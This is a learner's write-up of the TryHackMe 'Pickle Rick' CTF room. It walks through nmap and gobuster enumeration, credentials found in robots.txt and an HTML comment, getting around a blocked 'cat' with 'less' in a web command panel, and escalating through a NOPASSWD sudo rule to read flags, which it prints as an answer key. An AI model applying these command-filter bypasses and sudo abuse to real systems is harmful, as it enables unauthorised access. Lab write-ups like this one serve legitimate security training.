# TryHackMe - Pickle Rick Writeup

## Room Overview
**Room Name:** Pickle Rick  
**Difficulty:** Easy  
**Category:** CTF, Web Exploitation, Linux Privilege Escalation  
**Target OS:** Linux  
**Date Completed:** September 27, 2026  
**Tools Used:** Nmap, Gobuster, Burp Suite, Linux Terminal, `less`, `sudo`

---

## 1. Reconnaissance

I started by scanning the target to identify open ports and services.

### Command Used:
```bash
nmap -sV -sC -p- -T4 <MACHINE_IP>
 
Findings:
• Port 22/tcp – SSH
• Port 80/tcp – HTTP (Apache) 
 
2. Enumeration
 
2.1 Web Directory Enumeration
 
I used Gobuster to find hidden directories and files.
gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirb/common.txt
 
Findings:
• /robots.txt – revealed a password string: WubbaLubbaDubDub
• /login.php – login portal 
2.2 Source Code Analysis
 
I checked the page source and found a username in a comment: R1ckRul3s. 
 
3. Initial Access
 
Using the credentials found:
• Username: R1ckRul3s
• Password: WubbaLubbaDubDub 
I logged into http://<MACHINE_IP>/login.php and gained access to a Command Panel. 
 
4. Exploitation – Command Panel
 
The panel allowed executing system commands. I first listed files:
ls
 
I found a file named Sup3rS3cretPickl3Ingred.txt. Attempting to read it with cat gave a "Command disabled" message.
 
Bypass: I used less instead:
less Sup3rS3cretPickl3Ingred.txt
 
Result (First Ingredient): mr. meeseeks hair 
 
5. Privilege Escalation
 
I checked sudo permissions:
sudo -l
 
Result: (ALL) NOPASSWD: ALL – I could run any command as root without a password.
 
I listed root's directory:
sudo ls /root
 
Found 3rd.txt and read it:
sudo less /root/3rd.txt
 
Result (Third Ingredient): fleeb juice
 
Next, I checked the user rick's home directory:
sudo ls /home/rick
sudo less /home/rick/2nd.txt
 
Result (Second Ingredient): 1 jerry tear 
 
6. Flags Summary
• First Ingredient: mr. meeseeks hair
• Second Ingredient: 1 jerry tear
• Third Ingredient: fleeb juice 
 
7. Mistakes & Challenges Faced
1. Command filter bypass:
cat was disabled. I learned to use alternatives like less, head, grep.
2. Incorrect flag format:
I initially added extra underscores from the answer format placeholder. I learned to paste only the exact flag.
3. Internet connectivity:
Weak connection caused delays. I learned to be patient and retry. 
 
8. What I Learned
• Web enumeration with Gobuster (robots.txt, source code).
• Bypassing command filters.
• Linux privilege escalation via misconfigured sudo.
• The importance of reading file permissions and using sudo -l. 
 
9. Recommendations for Defense
• Remove sensitive information from public files (robots.txt, HTML comments).
• Enforce strong password policies.
• Restrict sudo permissions – never allow NOPASSWD: ALL.
• Disable dangerous PHP functions (e.g., shell_exec). 
 
10. References
• TryHackMe Pickle Rick Room 
 
Written by: Salah Eddin Essbihi
LinkedIn: salah-eddin-essbihi
TryHackMe: cyber.salah.sec
GitHub: salahreds06-selawy 
